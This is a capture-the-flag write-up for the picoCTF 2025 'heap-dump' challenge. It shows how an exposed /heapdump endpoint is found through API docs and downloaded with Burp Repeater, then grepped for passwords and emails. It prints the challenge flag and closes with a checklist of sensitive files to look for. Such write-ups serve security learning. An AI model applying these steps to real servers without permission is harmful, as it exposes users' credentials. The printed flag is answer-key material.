# 📝 heap-dump — Heap Dump Analysis | picoCTF 2025

> 📅 **Date:** August 2, 2025  
> 🎓 **Challenge Type:** Web Exploitation (Heap Dump)  
> 🏁 **Status:** Solved  
> 🔐 **Author:** [@am1tt]

---

**Challenge Name:** `heap-dump`  
**Challenge URL:**  
```
http://verbal-sleep.picoctf.net:61925
```

---

## 💡 Understanding Heap Dump Exposure

Heap dumps can contain a snapshot of memory at a given point in time, often exposing sensitive data like credentials, tokens, or internal application logic.

In web applications, if a `.heapsnapshot` file is accessible, it can be parsed for secrets using tools like `grep`, browser DevTools, or JSON viewers.

---

## 🛠️ Solution Steps

### 🔍 Step 1: Basic Recon

Used Burp Suite with proxy enabled to visit the homepage:

```
http://verbal-sleep.picoctf.net:61925
```

📭 Nothing useful was shown directly.

---

### 🔎 Step 2: Discovering the Heap Dump

Visited the API documentation:

```
http://verbal-sleep.picoctf.net:61925/api-docs/#/Diagnosing/get_heapdump
```

📁 This hinted at a `GET /heapdump` endpoint.

---

### 📥 Step 3: Downloading the Heap Snapshot

Used **Repeater** in Burp Suite to issue the request:

```http
GET /heapdump HTTP/1.1
Host: verbal-sleep.picoctf.net:61925
```

💾 The server returned a downloadable file named:

```
heapdump-1754137158919.heapsnapshot
```

---

### 🧪 Step 4: Analyzing the Heap Dump

Used `grep` to search for credentials inside the dump file:

```bash
grep -i "password" heapdump-1754137158919.heapsnapshot
grep -i "email" heapdump-1754137158919.heapsnapshot
```

🔐 Found credential patterns embedded in the file!

---

### 🚩 Step 5: Retrieve the Flag

Within the grep results or via Burp Repeater, found and extracted:

```
picoCTF{h34p_3xp0s3d_y0ur_s3cr3ts}
```

---

## 🧰 Tools Used

- Burp Suite
- Burp Repeater
- grep
- Browser DevTools

---

## ✅ Flag

```
picoCTF{h34p_3xp0s3d_y0ur_s3cr3ts}
```

---

## 📘 Notes

- Always inspect `/api-docs` or Swagger if available
- Look out for `.heapsnapshot`, `.memdump`, `.env`, `.bak`, etc.
- Use `grep` or `jq` to analyze large JSON heap snapshots efficiently
- Snapshot memory dumps often expose plaintext secrets

---

> 👤 [@am1tt](https://github.com/am1tt) | 🔐 Cybersecurity | 💥 CTF | 🧠 Pentesting
